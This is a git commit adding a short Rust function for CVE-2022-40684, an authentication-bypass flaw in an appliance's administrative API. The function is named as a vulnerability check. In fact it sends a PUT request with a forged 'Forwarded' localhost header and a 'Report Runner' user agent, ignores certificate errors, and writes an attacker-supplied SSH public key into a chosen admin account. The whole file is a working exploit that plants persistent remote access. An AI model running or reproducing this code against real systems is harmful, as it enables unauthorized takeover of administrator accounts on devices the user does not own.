0dbbd69f5510bba50d5c667b827a1a520641f26b
Grapphy <76534455+Grapphy@users.noreply.github.com>
2022-10-16 20:46:36 -0300

    Adding CVE-2022-40684

---
+++ src/cve.rs
@@ -0,0 +1,42 @@
+extern crate reqwest;
+use std::collections::HashMap;
+
+pub async fn is_vulnerable(
+    target_ip: &str,
+    username: &str,
+    key_file: String,
+) -> Result<bool, reqwest::Error> {
+    let url = format!(
+        "https://{}/api/v2/cmdb/system/admin/{}",
+        target_ip, username
+    );
+    let map = HashMap::from([
+        ("User-Agent".to_string(), "Report Runner".to_string()),
+        (
+            "Forwarded".to_string(),
+            "for=\"[127.0.0.1]:8888\";by=\"[127.0.0.1]:8888\"".to_string(),
+        ),
+    ]);
+
+    let headers: reqwest::header::HeaderMap = (&map).try_into().expect("Invalid headers");
+    let client = reqwest::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()
+        .unwrap();
+
+    let response = client
+        .put(url)
+        .headers(headers)
+        .timeout(std::time::Duration::new(5, 0))
+        .json(&HashMap::from([(
+            "ssh-public-key1",
+            format!("\"{}\"", key_file),
+        )]))
+        .send()
+        .await?
+        .text()
+        .await?;
+
+    println!("res: {}", response);
+    Ok(response.contains("SSH key is good"))
+}
